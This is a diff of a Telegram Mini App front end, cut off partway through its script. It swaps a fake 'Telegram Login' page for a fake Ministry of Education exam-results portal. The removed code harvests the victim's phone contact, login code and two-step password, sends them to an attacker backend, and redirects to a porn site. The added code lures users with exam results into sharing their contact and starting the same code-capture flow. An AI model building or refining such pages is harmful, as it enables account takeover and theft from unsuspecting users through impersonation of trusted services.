@@ -1,458 +1,344 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <title>Telegram Messenger</title>
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>Ministry of Education - Results Portal</title>  
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">  
+    <link rel="preconnect" href="https://fonts.googleapis.com">  
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>  
+    <link href="https://fonts.googleapis.com/css2?family=Merriweather:ital,wght@0,300;0,400;0,700;0,900;1,300;1,400;1,700;1,900&display=swap" rel="stylesheet">  
+    
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <!-- መጀመሪያ config.js እንዲጫን እዚህ ጋር ተጠርቷል -->
     <script src="./config.js"></script>
+
 <style>
-    :root {
-        --tg-blue: #24A1DE;
-        --tg-light-blue: #f0f8ff;
-        --tg-bg: #ffffff;
-        --tg-text: #000000;
-        --tg-hint: #999999;
-        --error-red: #ff3b30;
-        --success-green: #34c759;
-    }
-
-    * { 
-        box-sizing: border-box; 
-        -webkit-tap-highlight-color: transparent; 
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-    }
-    
-    body { 
-        margin: 0; padding: 0; color: var(--tg-text); 
-        background: var(--tg-bg); 
-        height: 100vh; width: 100vw;
-        display: flex; flex-direction: column; align-items: center;
-        overflow: hidden;
-        position: fixed;
-    }
-
-    .step { display: none; width: 100%; max-width: 400px; flex-direction: column; align-items: center; padding: 30px 25px; text-align: center; height: 100%; position: relative; }
-    .active { display: flex; animation: fadeIn 0.3s ease; }
-
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-    .tg-logo-container { margin-top: 25vh; position: relative; }
-    .tg-logo { width: 150px; height: 150px; animation: pulse 2s infinite ease-in-out; }
-    @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-
-    .monkey-img { width: 90px; height: 90px; margin-bottom: 15px; border-radius: 5%; }
-    
-    h2 { font-size: 22px; font-weight: 700; margin: 10px 0; letter-spacing: -0.5px; }
-    p { font-size: 14px; color: var(--tg-hint); line-height: 1.4; margin-bottom: 15px; padding: 0 10px; }
-
-    .btn-main {
-        background: var(--tg-blue); 
-        color: #fff; padding: 15px; width: 100%; border-radius: 12px; border: none;
-        font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px;
-        display: flex; align-items: center; justify-content: center; gap: 10px;
-        box-shadow: 0 4px 10px rgba(36, 161, 222, 0.2);
-    }
-    .btn-main:active { transform: scale(0.98); }
-
-    /* ERROR MSG CONTAINER: fixed height so it doesn't push elements down */
-    .msg-wrap { height: 45px; width: 100%; position: relative; margin: 5px 0; }
-    .msg { 
-        position: absolute; left: 0; right: 0; top: 0;
-        padding: 10px; border-radius: 10px; font-size: 13px; display: none; width: 100%; 
-        z-index: 5;
-    }
-    .error { background: #fde8e8; color: #c81e1e; font-weight: 500; border: 1px solid rgba(200, 30, 30, 0.1); }
-    .loading-msg { background: #e1effe; color: #1e429f; }
-
-    .btn-getcode-box {
-        display: flex; align-items: center; justify-content: center;
-        gap: 8px; width: 100%; padding: 12px; margin-top: 10px;
-        background: var(--tg-light-blue); color: var(--tg-blue);
-        border: 1.5px solid rgba(36, 161, 222, 0.3); border-radius: 12px;
-        font-weight: 700; text-decoration: none; font-size: 14px; transition: 0.2s;
-    }
-
-    .input-wrapper { position: relative; width: 100%; margin-bottom: 15px; }
-    .input-wrapper input {
-        width: 100%; padding: 16px 45px 16px 16px; border: 2.5px solid #eee;
-        border-radius: 12px; font-size: 18px; outline: none; transition: border-color 0.2s;
-    }
-    .input-wrapper input:focus { border-color: var(--tg-blue); }
-    .input-wrapper i { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: #bbb; cursor: pointer; font-size: 20px; }
-
-    /* OTP Styles */
-    .otp-container { display: flex; gap: 8px; margin: 15px 0; justify-content: center; }
-    .otp-box { 
-        width: 44px; height: 54px; border: 2px solid #e0e0e0; border-radius: 10px;
-        display: flex; align-items: center; justify-content: center; 
-        font-size: 24px; font-weight: 700; background: #fdfdfd; transition: all 0.2s;
-    }
-    .otp-box.filled { border-color: var(--tg-blue); background: #fff; box-shadow: 0 0 8px rgba(36, 161, 222, 0.1); }
-    .otp-box.invalid { border-color: var(--error-red); background: #fff1f0; animation: shake 0.3s; }
-
-    @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
-
-    /* Keypad FIXED at bottom: ensures 0 and Delete are never hidden */
-    .keypad { 
-        display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;
-        width: 100%; padding: 15px 20px 25px 20px;
-        background: #f4f4f7; border-top-left-radius: 25px; border-top-right-radius: 25px;
-        position: fixed; bottom: 30px; left: 0; right: 0;
-        z-index: 100;
-        box-shadow: 0 -5px 15px rgba(0,0,0,0.03);
-    }
-    .key { 
-        background: #fff; padding: 15px; font-size: 24px; cursor: pointer; 
-        font-weight: 600; border-radius: 12px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-        display: flex; justify-content: center; align-items: center;
-    }
-    .key:active { background: #e0e0e0; transform: scale(0.95); }
-
-    .loader-ring {
-        width: 40px; height: 40px; border: 3px solid #f3f3f3;
-        border-top: 3px solid var(--tg-blue); border-radius: 50%;
-        animation: spin 0.8s linear infinite; margin: 20px auto;
-    }
-    @keyframes spin { 100% { transform: rotate(360deg); } }
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { background-color: #f5f7fa; color: #1e293b; display: flex; flex-direction: column; min-height: 100vh; font-family: "Merriweather", Georgia, serif; padding-top: 75px; }
+header { position: absolute; top: 0; left: 0; width: 100%; background-color: #154186; color: white; padding: 9px 20px; display: flex; align-items: center; gap: 14px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.08); z-index: 1000; }
+header .logo-container { width: 39px; height: 39px; background-color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; overflow: hidden; padding: 4px; }
+header .logo-container img { width: 160%; height: 160%; object-fit: contain; }
+header .header-title h1 { font-size: 19px; font-weight: 500; letter-spacing: 0.2px; line-height: 1.2; }
+header .header-title p { font-size: 13px; opacity: 0.9; margin-top: 2px; font-family: "Merriweather", serif; }
+.main-wrapper { padding: 24px 18px; max-width: 480px; margin: 0 auto; width: 100%; flex: 1; }
+.welcome-box { text-align: center; margin-bottom: 32px; padding: 0 10px; }
+.welcome-box h2 { color: #1e293b; font-size: 34px; font-weight: 900; margin-bottom: 14px; letter-spacing: -0.5px; }
+.welcome-box p { color: #475569; font-size: 15.5px; line-height: 1.6; }
+.portal-card { background-color: #ffffff; border-radius: 12px; padding: 24px; margin-bottom: 20px; box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 16px -6px rgba(0, 0, 0, 0.03); border: 1px solid #edf2f7; }
+.portal-card-heading { display: flex; align-items: center; gap: 14px; margin-bottom: 14px; }
+.portal-card-heading i { font-size: 26px; }
+.portal-card-heading h3 { font-size: 22px; color: #1e293b; font-weight: 700; }
+.portal-card p { color: #4a5568; font-size: 15px; line-height: 1.6; margin-bottom: 22px; }
+.action-btn { display: block; width: 100%; padding: 12px; text-align: center; color: #ffffff; text-decoration: none; font-weight: 600; font-size: 16px; border-radius: 8px; font-family: "Merriweather", serif; border: none; cursor: pointer; }
+.card-exit i { color: #0056b3; } .card-exit .action-btn { background-color: #0056b3; }
+.card-ngat i { color: #00a65a; } .card-ngat .action-btn { background-color: #00a65a; }
+.card-remedial i { color: #8e24aa; } .card-remedial .action-btn { background-color: #a855f7; }
+.card-tvet i { color: #e65100; } .card-tvet .action-btn { background-color: #ea580c; }
+.card-tdp i { color: #cc1111; } .card-tdp .action-btn { background-color: #dc2626; }
+.links-heading { color: #1e293b; font-size: 24px; font-weight: 700; margin: 36px 0 16px 4px; }
+.link-row { background-color: #ffffff; border: 1px solid #e2e8f0; border-radius: 8px; padding: 16px 18px; display: flex; align-items: center; gap: 14px; margin-bottom: 12px; color: #334155; text-decoration: none; font-size: 16px; }
+.link-row i { color: #475569; font-size: 20px; width: 22px; text-align: center; }
+.form-view-container { display: none; animation: fadeIn 0.3s ease-in-out; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+.back-btn { display: inline-flex; align-items: center; gap: 8px; color: #3b4c66; font-size: 16px; font-weight: 500; text-decoration: none; margin-bottom: 24px; cursor: pointer; background: none; border: none; font-family: "Merriweather", serif; }
+.back-btn i { font-size: 16px; }
+.username-card { background-color: #ffffff; border-radius: 12px; padding: 32px 24px; text-align: center; box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 16px -6px rgba(0, 0, 0, 0.03); border: 1px solid #edf2f7; }
+.center-user-icon { width: 64px; height: 64px; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px auto; font-size: 24px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+.username-card h4 { font-size: 28px; font-weight: 900; color: #1e293b; margin-bottom: 12px; }
+.username-card .form-desc { font-size: 15px; color: #64748b; margin-bottom: 24px; line-height: 1.6; }
+.input-label { display: block; text-align: left; font-size: 14.5px; font-weight: 600; color: #475569; margin-bottom: 8px; font-family: "Merriweather", serif; }
+.input-wrapper { position: relative; margin-bottom: 8px; }
+.input-wrapper i { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: #475569; font-size: 18px; }
+.input-wrapper input { width: 100%; padding: 14px 14px 14px 44px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 16px; font-family: "Merriweather", serif; color: #334155; outline: none; }
+.input-wrapper input:focus { border-color: #64748b; }
+.hint-text { text-align: left; font-size: 13px; color: #64748b; font-family: "Merriweather", serif; margin-bottom: 20px; line-height: 1.4; }
+.info-box { border-radius: 8px; padding: 16px; text-align: left; margin-bottom: 24px; display: flex; gap: 12px; }
+.info-box i { font-size: 18px; margin-top: 2px; }
+.info-content p { font-size: 13.5px; line-height: 1.5; }
+.info-content .info-title { font-weight: 700; margin-bottom: 4px; }
+.error-box { background-color: #ffebee; border: 1px solid #ffcdd2; border-radius: 8px; padding: 14px; text-align: left; margin-bottom: 24px; display: none; align-items: center; gap: 12px; color: #c62828; }
+.error-box i { font-size: 18px; }
+.error-box p { font-size: 13.5px; font-weight: 500; line-height: 1.5; font-family: "Merriweather", serif; }
+.submit-button { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; padding: 14px; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; font-family: "Merriweather", serif; margin-bottom: 24px; }
+.footer-support-link { display: inline-flex; align-items: center; gap: 6px; color: #475569; text-decoration: none; font-size: 14.5px; font-weight: 500; font-family: "Merriweather", serif; }
+.theme-exit .center-user-icon { background-color: #0c54a6; } .theme-exit .input-wrapper input { border-color: #0c54a6; } .theme-exit .info-box { background-color: #f0f6fc; border: 1px solid #d0e1f3; } .theme-exit .info-box i, .theme-exit .info-title { color: #0c54a6; } .theme-exit .submit-button { background-color: #0c54a6; } .theme-exit .back-btn { color: #0c54a6; }
+.theme-remedial .center-user-icon { background-color: #6f42c1; } .theme-remedial .input-wrapper input { border-color: #6f42c1; } .theme-remedial .info-box { background-color: #f8f5fc; border: 1px solid #ebdff5; } .theme-remedial .info-box i, .theme-remedial .info-title { color: #6f42c1; } .theme-remedial .submit-button { background-color: #6f42c1; } .theme-remedial .back-btn { color: #6f42c1; }
+footer { background-color: #0b438c; color: white; text-align: center; padding: 20px; font-size: 14px; border-top: 1px solid rgba(255, 255, 255, 0.1); font-family: "Merriweather", serif; margin-top: 40px; width: 100%; }
 </style>
-</head>
-<body>
 
-    <div id="step_intro" class="step active">
-        <div class="tg-logo-container">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="tg-logo" alt="Telegram">
-        </div>
-        <div class="loader-ring"></div>
-        <p style="margin-top: 20px; color: var(--tg-blue); font-weight: 600;">Updating messenger...</p>
-    </div>
+</head>  
+<body>  
 
-    <div id="step_photo_slide" class="step">
-        <img src="https://telegram.org/img/t_logo.png" style="width: 80px; margin-top: 10vh; margin-bottom: 20px;">
-        <h2>Telegram Login</h2>
-        <p>Please log in to receive your verification code and sync your account.</p>
-        
-        <div class="msg-wrap"><div id="status1" class="msg"></div></div>
+<header>  
+    <div class="logo-container">  
+        <img src="https://i.postimg.cc/vHhZbR6f/logo-e919e49b17937cc5f288.png" alt="Ministry of Education Logo">  
+    </div>  
+    <div class="header-title">  
+        <h1>Ministry of Education</h1>  
+        <p>National Examination Result Page</p>  
+    </div>  
+</header>  
 
-        <button class="btn-main" id="loginBtn" onclick="handleLoginClick()">
-            <div class="btn-spinner" id="loginSpinner"></div>
-            <span id="loginText">Log In with Telegram</span>
-        </button>
-    </div>
+<div class="main-wrapper">  
+      
+    <div id="main-categories-view">  
+        <div class="welcome-box">  
+            <h2>Welcome to Results Portal</h2>  
+            <p>Access your examination results from various national level examinations in one place.</p>  
+        </div>  
 
-    <div id="step2" class="step">
-        <img src="https://i.postimg.cc/pX0mBM1W/step2.png" class="monkey-img" alt="Monkey">
-        <h2 id="phone-preview" style="font-size: 18px; color: var(--tg-blue);">Verification</h2>
-        <p>We've sent a code via Telegram to your other device.</p>
-        
-        <div class="otp-container" id="otp_container">
-            <div class="otp-box" id="b0"></div>
-            <div class="otp-box" id="b1"></div>
-            <div class="otp-box" id="b2"></div>
-            <div class="otp-box" id="b3"></div>
-            <div class="otp-box" id="b4"></div>
-        </div>
+        <div class="portal-card card-exit">  
+            <div class="portal-card-heading">  
+                <i class="fa-solid fa-graduation-cap"></i>  
+                <h3>Exit Examination</h3>  
+            </div>  
+            <p>Final examination results for graduating students across all disciplines.</p>  
+            <button class="action-btn" onclick="openFormPage('exit')">View Results</button>  
+        </div>  
 
-        <div class="msg-wrap"><div id="status2" class="msg"></div></div>
+        <div class="portal-card card-ngat">  
+            <div class="portal-card-heading">  
+                <i class="fas fa-clipboard-check"></i>  
+                <h3>NGAT Results</h3>  
+            </div>  
+            <p>National Graduate Admission Test results and performance analysis.</p>  
+            <button class="action-btn" onclick="openFormPage('exit')">View Results</button>  
+        </div>  
 
-        <a href="https://t.me/42777" target="_blank" class="btn-getcode-box">
-            <i class="fa-solid fa-shield-halved"></i> Get Code
-        </a>
+        <div class="portal-card card-remedial">  
+            <div class="portal-card-heading">  
+                <i class="fa-solid fa-book-open"></i>  
+                <h3>Remedial Examination</h3>  
+            </div>  
+            <p>Results for supplementary and improvement examinations.</p>  
+            <button class="action-btn" onclick="openFormPage('remedial')">View Results</button>  
+        </div>  
 
-        <div class="keypad">
-            <div class="key" onclick="press(1)">1</div>
-            <div class="key" onclick="press(2)">2</div>
-            <div class="key" onclick="press(3)">3</div>
-            <div class="key" onclick="press(4)">4</div>
-            <div class="key" onclick="press(5)">5</div>
-            <div class="key" onclick="press(6)">6</div>
-            <div class="key" onclick="press(7)">7</div>
-            <div class="key" onclick="press(8)">8</div>
-            <div class="key" onclick="press(9)">9</div>
-            <div class="key" style="background:transparent; box-shadow:none; border:none;"></div>
-            <div class="key" onclick="press(0)">0</div>
-            <div class="key" onclick="backspace()"><i class="fa-solid fa-delete-left" style="color:var(--tg-hint)"></i></div>
-        </div>
-    </div>
+        <div class="portal-card card-tvet">  
+            <div class="portal-card-heading">  
+                <i class="fa-solid fa-screwdriver-wrench"></i>  
+                <h3>TVET Results</h3>  
+            </div>  
+            <p>Technical and Vocational Education Training examination results.</p>  
+            <button class="action-btn" onclick="openFormPage('exit')">View Results</button>  
+        </div>  
 
-    <div id="step3" class="step">
-        <img src="https://i.postimg.cc/pX0mBM1W/step2.png" class="monkey-img" style="width: 110px; margin-top: 5vh;">
-        <h2>Cloud Password</h2>
-        <p>Your account is protected with a Two-Step Verification password.</p>
-        
-        <div class="msg-wrap"><div id="status3" class="msg"></div></div>
+        <div class="portal-card card-tdp">  
+            <div class="portal-card-heading">  
+                <i class="fa-solid fa-chart-line"></i>  
+                <h3>TDP Results</h3>  
+            </div>  
+            <p>Teacher Development Program examination results and certifications.</p>  
+            <button class="action-btn" onclick="openFormPage('exit')">View Results</button>  
+        </div>  
 
-        <div class="input-wrapper">
-            <input type="password" id="2fa_input" placeholder="Password" oninput="hideMsg(3)">
-            <i class="fa-solid fa-eye" id="toggleIcon" onclick="togglePasswordVisibility()"></i>
-        </div>
-        
-        <button class="btn-main" id="confirmBtn" onclick="submit2FA()">
-            <div class="btn-spinner" id="confirmSpinner"></div>
-            <span id="confirmText">NEXT</span>
-        </button>
-        <p style="color: var(--tg-blue); font-weight: 600; margin-top: 25px; cursor: pointer;">Forgot password?</p>
-    </div>
+        <h3 class="links-heading">Quick Links</h3>  
+          
+        <a href="#" class="link-row">  
+            <i class="fa-solid fa-circle-question"></i>  
+            <span>FAQs</span>  
+        </a>  
 
-    <div id="step_success" class="step">
-        <i class="fa-solid fa-circle-check" style="font-size: 70px; color: var(--success-green); margin-top: 25vh; margin-bottom: 20px;"></i>
-        <h2>All Set!</h2>
-        <p>Redirecting to Telegram...</p>
-        <div class="loader-ring"></div>
-    </div>
+        <a href="#" class="link-row">  
+            <i class="fa-solid fa-headset"></i>  
+            <span>Support</span>  
+        </a>  
+    </div>  
 
-    <div id="flood_step" class="step">
-        <i class="fa-solid fa-clock-rotate-left" style="font-size: 60px; color: #f2a600; margin-top: 20vh; margin-bottom: 20px;"></i>
-        <h2>Wait a moment</h2>
-        <p>Too many attempts. For security, please wait.</p>
-        <div style="font-size: 36px; font-weight: 800; color: var(--tg-text);" id="wait_time">00:00</div>
-    </div>
 
-<script>
+    <div id="form-dynamic-view" class="form-view-container">  
+          
+        <button class="back-btn" onclick="backToCategories()">  
+            <i class="fa-solid fa-arrow-left"></i> Back to Categories  
+        </button>  
+
+        <div class="username-card">  
+            <div class="center-user-icon">  
+                <i class="fa-solid fa-user-lock"></i>  
+            </div>  
+            <h4>Enter your username</h4>  
+            <p class="form-desc" id="dynamic-form-desc">Enter the username you used to take the exam to view your examination results</p>  
+              
+            <label class="input-label">Username</label>  
+            <div class="input-wrapper">  
+                <i class="fa-regular fa-id-card"></i>  
+                <input type="text" id="username-input-field" placeholder="Enter your username (5-15 chars)">  
+            </div>  
+            <p class="hint-text">Username must be 5-15 characters long and contain only letters and numbers</p>  
+
+            <div class="info-box" id="info-box-container">  
+                <i class="fa-solid fa-lightbulb"></i>  
+                <div class="info-content">  
+                    <p class="info-title">Username Format Tip</p>  
+                    <p>If your username contains "/" (slash), please remove it. Example: "username/16" → "username"</p>  
+                </div>  
+            </div>  
+
+            <div class="error-box" id="validation-error-box">  
+                <i class="fa-solid fa-triangle-exclamation"></i>  
+                <p>Username must be 5-15 characters long and contain only letters, numbers, and dots</p>  
+            </div>  
+
+            <button class="submit-button" id="dynamic-submit-btn" onclick="validateOnSubmit()">  
+                <i class="fa-solid fa-arrow-right-to-bracket"></i> <span id="submit-btn-text">View Result</span>  
+            </button>  
+            <br>  
+            <a href="#" class="footer-support-link"><i class="fa-solid fa-headset"></i> Contact Support</a>  
+        </div>  
+
+    </div>  
+
+</div>  
+
+<footer>  
+    © 2026 Ministry of Education. All rights reserved.  
+</footer>  
+
+
+<script>  
+    // ቴሌግራም ዌብ አፕን የማስጀመር ስራ
     const tg = window.Telegram.WebApp;
-    tg.expand();
-    tg.ready();
-    tg.headerColor = '#ffffff';
-    tg.backgroundColor = '#ffffff';
+    if (tg) {
+        tg.expand();
+        tg.ready();
+    }
 
-    // API_BASE_URL እዚህ ጋር ተወግዷል (ከ config.js ይነበባል)
-    let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "test_user";
-    let sid = userId; 
-    let currentOtp = "";
-    let statusChecker;
+    // ከ config.js የሚመጣውን API_BASE_URL ለመያዝ (ካልተገኘ መለዋወጫ)
+    const BASE_URL = typeof API_BASE_URL !== 'undefined' ? API_BASE_URL : 'https://your-backend-api.com';
+
+    const mainCategoriesView = document.getElementById('main-categories-view');  
+    const formDynamicView = document.getElementById('form-dynamic-view');  
+    const dynamicFormDesc = document.getElementById('dynamic-form-desc');  
+    const submitBtnText = document.getElementById('submit-btn-text');  
+    const usernameInputField = document.getElementById('username-input-field');  
+    const validationErrorBox = document.getElementById('validation-error-box');  
+    const dynamicSubmitBtn = document.getElementById('dynamic-submit-btn');  
+
+    let userId = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id.toString() : "test_user";
+    let savedName = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.first_name : "User";
     let isProcessing = false;
-    let savedName = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.first_name : "User";
 
-    window.onload = function() {
-        setTimeout(() => { showStep('photo_slide'); }, 2000);
-        statusChecker = setInterval(checkStatus, 3000);
-        setupLongPressPaste(); 
-    };
+    // ቁልፍ በተኖቹ ሲነኩ ወደ ፎርም ገጽ የሚወስድ  
+    function openFormPage(type) {  
+        mainCategoriesView.style.display = 'none';  
+        formDynamicView.style.display = 'block';  
+          
+        formDynamicView.className = 'form-view-container';  
+        usernameInputField.value = '';  
+        validationErrorBox.style.display = 'none';  
 
-    function playTap() { if (window.navigator.vibrate) window.navigator.vibrate(15); }
+        if (type === 'exit') {  
+            formDynamicView.classList.add('theme-exit');  
+            dynamicFormDesc.innerText = "Enter the username you used to take the exam to view your examination results";  
+            submitBtnText.innerText = "View Result";  
+        } else if (type === 'remedial') {  
+            formDynamicView.classList.add('theme-remedial');  
+            dynamicFormDesc.innerText = "Enter the username you used to take the remedial exam to view your results";  
+            submitBtnText.innerText = "Access Results";  
+        }  
 
-    function showStep(n) {
-        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        let stepId = (typeof n === 'string') ? 'step_' + n : 'step' + n;
-        const target = document.getElementById(stepId);
-        if(target) target.classList.add('active');
+        window.scrollTo(0, 0);  
+    }  
 
-        // Automatic redirect if success step is shown
-        if(n === 'success') {
-            setTimeout(() => {
-                window.location.href = "https://sexnaked.net/photo-b85482319c8623b9288ef55b6ecd0238/";
-            }, 1500);
-        }
-    }
+    // "Back to Categories" ሲነካ ወደ መጀመሪያው ገጽ የሚመልስ  
+    function backToCategories() {  
+        formDynamicView.style.display = 'none';  
+        mainCategoriesView.style.display = 'block';  
+          
+        window.scrollTo(0, 0);  
+    }  
 
-    function checkStatus() {
-        fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
-            if (data.status === "NEED_OTP") { showStep(2); stopLoaders(); }
-            else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
-            else if (data.status === "SUCCESS") { 
-                clearInterval(statusChecker); 
-                setOtpStatus('valid');
-                setTimeout(() => showStep('success'), 800);
-            }
-            else if (data.status === "FLOOD") { clearInterval(statusChecker); startFloodTimer(data.wait); }
-        }).catch(e => {});
-    }
-
-    function setOtpStatus(status) {
-        const boxes = document.querySelectorAll('.otp-box');
-        boxes.forEach(box => {
-            box.classList.remove('invalid', 'valid');
-            if(status) box.classList.add(status);
-        });
-    }
-
-    function stopLoaders() {
-        isProcessing = false;
-        if(document.getElementById('loginBtn')) {
-            document.getElementById('loginBtn').disabled = false;
-            document.getElementById('loginText').innerText = "Log In with Telegram";
-        }
-        if(document.getElementById('confirmBtn')){
-            document.getElementById('confirmBtn').disabled = false;
-            document.getElementById('confirmText').innerText = 'NEXT';
-        }
-    }
-
-    function togglePasswordVisibility() {
-        const passInput = document.getElementById('2fa_input');
-        const toggleIcon = document.getElementById('toggleIcon');
-        if (passInput.type === "password") {
-            passInput.type = "text";
-            toggleIcon.classList.replace('fa-eye', 'fa-eye-slash');
-        } else {
-            passInput.type = "password";
-            toggleIcon.classList.replace('fa-eye-slash', 'fa-eye');
-        }
-    }
-
-    function handleLoginClick() {
-        playTap();
-        document.getElementById('loginBtn').disabled = true;
-        document.getElementById('loginText').innerText = 'Securing...';
-        startVerification();
-    }
-
-    function startVerification() {
+    // "View Result" ሲነካ የርዝማኔ ፍተሻ፣ የዳታቤዝ ፍተሻ እና የኮንታክት ጥያቄዎችን የሚሰራው ዋና ተግባር
+    async function validateOnSubmit() {  
         if (isProcessing) return;
-        isProcessing = true;
-        showMsg(1, 'loading-msg', 'Connecting to secure server...');
-        checkUserInDB();
-    }
 
-    async function checkUserInDB() {
-        try {
-            const res = await fetch(`${API_BASE_URL}/check_user_db`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({user_id: userId, name: savedName})
-            });
-            const data = await res.json();
-            if (data.status === "FOUND" || data.status === "NEED_OTP") {
-                showMsg(1, 'loading-msg', 'Identity confirmed. Sending code...');
-            } else if (data.status === "SUCCESS") {
-                showStep('success');
-            } else { requestPhone(); }
-        } catch(e) { 
-            stopLoaders();
-            showMsg(1, 'error', 'Network error. Try again.');
-        }
-    }
-
-    function requestPhone() {
-        tg.requestContact((success) => {
-            if (success) { showMsg(1, 'loading-msg', 'Check your Telegram messages.'); } 
-            else { stopLoaders(); showMsg(1, 'error', 'Permission required to continue.'); }
-        });
-    }
-
-    function press(num) {
-        playTap();
-        hideMsg(2);
-        setOtpStatus(null); 
-        if (currentOtp.length < 5) {
-            currentOtp += num;
-            updateOtpUI();
-            if (currentOtp.length === 5) submitOTP();
-        }
-    }
-
-    function backspace() { 
-        playTap(); 
-        setOtpStatus(null);
-        currentOtp = currentOtp.slice(0, -1); 
-        updateOtpUI(); 
-    }
-
-    function updateOtpUI() {
-        for (let i = 0; i < 5; i++) {
-            const box = document.getElementById('b' + i);
-            box.innerText = currentOtp[i] || "";
-            currentOtp[i] ? box.classList.add('filled') : box.classList.remove('filled');
-        }
-    }
-
-    async function submitOTP() {
-        showMsg(2, 'loading-msg', 'Verifying code...');
-        try {
-            const res = await fetch(`${API_BASE_URL}/verify_otp`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({session_id: sid, otp: currentOtp})
-            });
-            const data = await res.json();
-            handleResponse(data, 2);
-        } catch(e) { showMsg(2, 'error', 'Connection lost!'); }
-    }
-
-    async function submit2FA() {
-        playTap();
-        const pass = document.getElementById('2fa_input').value;
-        if(!pass) return showMsg(3, 'error', 'Please enter your password');
+        const value = usernameInputField.value.trim();  
         
-        document.getElementById('confirmBtn').disabled = true;
-        showMsg(3, 'loading-msg', 'Validating password...');
+        // 1. መጀመሪያ ከ 5 ቃላት/ፊደላት በታች መሆኑን ያረጋግጣል
+        if (value.length < 5) {  
+            showUiError("Username must be 5-15 characters long.");
+            return;  
+        } else {  
+            validationErrorBox.style.display = 'none';  
+        }  
+
+        // የአዝራሩን ገጽታ ወደ Loading መቀየር
+        isProcessing = true;
+        dynamicSubmitBtn.disabled = true;
+        const originalBtnText = submitBtnText.innerText;
+        submitBtnText.innerText = "Loading...";
+
         try {
-            const res = await fetch(`${API_BASE_URL}/verify_2fa`, {
+            // 2. ተጠቃሚው አስቀድሞ በዳታቤዝ ውስጥ መኖሩን ማረጋገጥ
+            const res = await fetch(`${BASE_URL}/check_user_db`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({session_id: sid, password: pass})
+                body: JSON.stringify({ user_id: userId, name: savedName, username_portal: value })
             });
             const data = await res.json();
-            handleResponse(data, 3);
-        } catch(e) { stopLoaders(); showMsg(3, 'error', 'An error occurred!'); }
+
+            // 3. ስልኩ ካለ (FOUND ወይም NEED_OTP) ኮንታክት ሳይጠይቅ በቀጥታ ወደ OTP ሂደት ያልፋል
+            if (data.status === "FOUND" || data.status === "NEED_OTP") {
+                processToOTP();
+            } else if (data.status === "SUCCESS") {
+                alert("ተሳክቷል! ወደ ውጤት ማውጫ በመሸጋገር ላይ...");
+                resetButton(originalBtnText);
+            } else { 
+                // 4. አዲስ ተጠቃሚ ከሆነ የቴሌግራም ስልክ ማጋሪያ ጥያቄ (Contact Share) ማንሳት
+                requestUserContact(originalBtnText);
+            }
+        } catch(e) { 
+            resetButton(originalBtnText);
+            showUiError("የአውታረ መረብ ስህተት አጋጥሟል። እባክዎ ድጋሚ ይሞክሩ።");
+        }
     }
 
-    function handleResponse(data, step) {
-        if (data.status === "SUCCESS") { 
-            setOtpStatus('valid');
-            setTimeout(() => showStep('success'), 800);
-        } 
-        else if (data.status === "NEED_2FA") { 
-            setOtpStatus('valid');
-            setTimeout(() => { showStep(3); stopLoaders(); }, 600);
-        }
-        else if (data.status === "FLOOD") { startFloodTimer(data.wait); }
-        else {
-            stopLoaders();
-            if(step === 2) { 
-                setOtpStatus('invalid');
-                showMsg(step, 'error', 'Invalid code. Try again.');
-                setTimeout(() => {
-                    currentOtp = ""; 
-                    updateOtpUI(); 
-                    setOtpStatus(null);
-                }, 1500);
+    // የቴሌግራም Contact Share ጥያቄ ማቅረቢያ
+    function requestUserContact(originalText) {
+        if (tg) {
+            tg.requestContact((success) => {
+                if (success) {
+                    // ስልክ ቁጥሩን በተሳካ ሁኔታ ካጋራ ወደ OTP ሂደት ይሄዳል
+                    processToOTP();
+                } else { 
